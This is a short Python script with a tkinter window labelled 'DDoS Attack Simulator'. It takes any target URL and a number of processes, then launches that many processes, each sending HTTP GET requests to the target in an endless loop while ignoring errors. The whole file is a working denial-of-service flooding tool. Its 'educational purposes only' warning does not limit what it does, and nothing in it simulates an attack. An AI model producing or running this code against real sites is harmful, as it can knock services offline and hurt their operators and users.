import multiprocessing
import requests
import tkinter as tk
from tkinter import messagebox

def send_request(url):
    while True:
        try:
            requests.get(url)
        except:
            pass

def ddos_attack(url, num_processes):
    processes = []
    for _ in range(num_processes):
        p = multiprocessing.Process(target=send_request, args=(url,))
        p.start()
        processes.append(p)
    
    for p in processes:
        p.join()

def start_attack():
    url = url_entry.get()
    try:
        num_processes = int(process_entry.get())
    except ValueError:
        messagebox.showerror("Error", "Please enter a valid number of processes")
        return
    
    messagebox.showwarning("Warning", "Starting DDoS attack. This is for educational purposes only.")
    ddos_attack(url, num_processes)

# Create main window
window = tk.Tk()
window.title("DDoS Attack Simulator")
window.geometry("300x150")

# URL input
tk.Label(window, text="Target URL:").pack()
url_entry = tk.Entry(window, width=40)
url_entry.pack()

# Number of processes input
tk.Label(window, text="Number of Processes:").pack()
process_entry = tk.Entry(window, width=10)
process_entry.pack()

# Start button
start_button = tk.Button(window, text="Start Attack", command=start_attack)
start_button.pack(pady=10)

window.mainloop()